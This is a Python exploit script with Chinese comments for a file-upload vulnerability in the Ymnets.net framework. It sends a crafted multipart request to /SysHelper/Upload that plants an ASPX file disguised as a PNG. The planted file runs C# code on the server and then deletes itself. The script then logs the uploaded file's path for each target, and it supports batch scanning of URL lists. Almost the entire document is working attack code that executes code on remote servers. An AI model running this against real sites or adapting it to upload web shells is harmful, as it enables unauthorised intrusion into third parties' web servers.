import requests
import argparse
#单个url
def check_vul(url):
    #拼接路径
    url1 = f'{url.strip()}'+'/SysHelper/Upload'
    #提交的数据
    data = '''------WebKitFormBoundaryu178FOm4XGgDZqeX
Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
Content-Type: image/png

<%@Page Language="C#"%>
<%
Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("bmloYW8=")));
System.IO.File.Delete(Request.PhysicalPath);
%>
------WebKitFormBoundaryu178FOm4XGgDZqeX--'''
    #设置ua头
    header = {
      'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX'
    }
    #尝试post提交数据，检查返回数据包中的状态码
    try:
        request = requests.post(url1, data=data, headers=header,timeout=6,verify=False)
        res = request.status_code
        try:
            json = request.json()
            url =f'{url.strip()}' + json['FilePath']
            if res == 200 and json['FilePath']:
                with open('result.txt','a') as r:
                    r.write(url+'\n')
                    print('【+++】%s存在漏洞【+++】' % (url)+'\n')
            else:
                print('%s不存在漏洞' % (url.strip()))
        except:
            print('%s不存在漏洞' % (url.strip()))
    except Exception as e:
        print('连接出现问题')
#批量检测
def check_vuls(filename):
    with open(filename,'r') as f:
        for readline in f.readlines():
            check_vul(readline)
#banner信息
def banner():
    info = '''
██╗   ██╗███╗   ███╗███╗   ██╗███████╗████████╗███████╗██╗   ██╗
╚██╗ ██╔╝████╗ ████║████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║   ██║
 ╚████╔╝ ██╔████╔██║██╔██╗ ██║█████╗     ██║   ███████╗██║   ██║
  ╚██╔╝  ██║╚██╔╝██║██║╚██╗██║██╔══╝     ██║   ╚════██║██║   ██║
   ██║   ██║ ╚═╝ ██║██║ ╚████║███████╗   ██║   ███████║╚██████╔╝
   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝ 
                                                                
'''
    print(info)
    print('-u http://www.xxx.com 即可进行单个漏洞检测')
    print('-l targetUrl.txt  即可对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('联系方式：author：ni1hao')
#主程序
def main():
    arg = argparse.ArgumentParser(description="Ymnets.net框架文件上传")
    arg.add_argument('-l',help='扫描网址文件')
    arg.add_argument('-u',help='目标网址')
    args = arg.parse_args()
    if not args.u and not args.l:
        banner()
    else:
        banner()
        try:
            if args.l:
                check_vuls('{}'.format(args.l))
            else:
                check_vul('{}'.format(args.u))
        except Exception as e:
            print('运行发生错误')
if __name__ == '__main__':
    main()